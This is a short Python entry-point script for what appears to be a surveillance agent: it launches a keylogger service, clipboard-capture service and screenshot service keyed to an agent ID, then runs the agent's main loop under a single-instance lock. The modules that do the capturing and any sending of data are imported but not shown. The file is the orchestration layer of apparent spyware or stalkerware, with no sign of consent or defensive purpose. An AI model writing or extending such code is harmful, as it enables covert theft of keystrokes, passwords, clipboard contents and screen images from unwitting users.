import sys
import platform

from config.settings import APP_NAME
from app.bootstrap import init_agent
from app.agent import Agent
from core.single_instance import SingleInstance
from services.keylogger import start_keylogger_service
from services.clipboard import start_clipboard_service
from services.screenshot import start_screenshot_service
from logger import logger

def main():
    agent_id = init_agent()
    SYSTEM = platform.system()

    # background services
    if SYSTEM in ["Windows", "Darwin"]:
        start_keylogger_service(agent_id)
        start_clipboard_service(agent_id)

    start_screenshot_service(agent_id)

    # main loop
    agent = Agent(agent_id)
    agent.run()


if __name__ == "__main__":
    instance = SingleInstance(APP_NAME)
    
    if not instance.acquire():
        logger.error(f"Another instance of {APP_NAME} is already running.")
        sys.exit(1)

    try:
        main()
    finally:
        instance.release()